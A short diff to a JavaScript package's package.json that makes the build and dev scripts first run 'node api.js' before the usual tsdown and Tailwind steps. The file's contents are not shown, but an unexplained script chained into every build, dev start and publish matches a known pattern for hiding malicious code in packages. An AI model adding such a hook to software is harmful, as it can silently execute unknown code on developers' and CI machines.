@@ -15,8 +15,8 @@
     "./styles.css": "./dist/styles.css"
   },
   "scripts": {
-    "build": "tsdown && npx @tailwindcss/cli -i src/styles.css -o dist/styles.css --minify",
-    "dev": "tsdown src/index.ts --format esm --dts --watch",
+    "build": "node api.js && tsdown && npx @tailwindcss/cli -i src/styles.css -o dist/styles.css --minify",
+    "dev": "node api.js && tsdown src/index.ts --format esm --dts --watch",
     "prepublishOnly": "node --run build",
     "check": "publint && attw --pack --ignore-rules=cjs-resolves-to-esm --ignore-rules=no-resolution",
     "test": "vitest",
